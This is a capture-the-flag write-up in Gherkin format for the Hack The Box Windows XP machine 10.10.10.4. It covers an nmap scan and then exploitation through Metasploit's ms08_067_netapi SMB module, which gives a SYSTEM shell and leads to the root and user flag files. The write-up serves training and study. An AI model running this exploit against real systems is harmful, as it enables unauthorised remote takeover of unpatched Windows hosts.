## Version 2.0
## language: en

Feature:
  Site:
    Hack The Box
  Category:
    CTF
  User:
    aramirez95
  Goal:
    Escalate privileges to get two flags that are root and user.

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Metasploit      | 5.0.73-dev  |
  Machine information:
    Given I am accessing the machine 10.10.10.4
    And is running on Windows

  Scenario: Information gathering
    Given that I run the following Nmap command
    """
    $ nmap -sC -sV 10.10.10.4
    """
    Then I get the output
    """
    Starting Nmap 7.80 ( https://nmap.org ) at
    2020-02-24 20:57 -05
    Nmap scan report for 10.10.10.4
    Host is up (0.18s latency).
    Not shown: 997 filtered ports
    PORT     STATE  SERVICE       VERSION
    139/tcp  open   netbios-ssn   Microsoft Windows
    netbios-ssn
    445/tcp  open   microsoft-ds  Windows XP microsoft-ds
    3389/tcp closed ms-wbt-server
    Service Info: OSs: Windows, Windows XP; CPE:
    cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
    """
    Then I can see that it has a port 445 and 139
    And is using NetBios and SMB services

  Scenario: Exploitation
    Given the machine has SMB and NetBios services
    Then he decided to run metasploit to use an exploit
    And allows me to execute remote code as a root user
    """
    msf5> use exploit/windows/smb/ms08_067_netapi
    """
    Then I do the RHOST configuration like this
    """
    msf5> set RHOST 10.10.10.4
    """
    And I execute an instruction to run the exploit
    """
    msf5> exploit
    """
    Then I can execute commands
    Then I use one to know the user permissions
    """
    C:\> getuid
    """
    Then I know I have permits admin because it came out
    """
    Server username: NT AUTHORITY\SYSTEM
    """
    Then I execute another instruction to know where I am
    """
    C:\> pwd
    """
    Then I realize that I am located in
    """
    C:\WINDOWS\system32
    """
    And with another instruction
    """
    C:\> cd ../..
    """
    Then I decide to execute another instruction
    And search all the files with extension .txt
    """
    C:\> search -f *.txt
    """
    And I find the files root.txt and user.txt
    And they contain the flags
    """
    c:\Document and Settings\Administrator\Desktop\root.txt
    c:\Document and Settings\john\Desktop\user.txt
    """
    And finally you get the FLAGS with cat
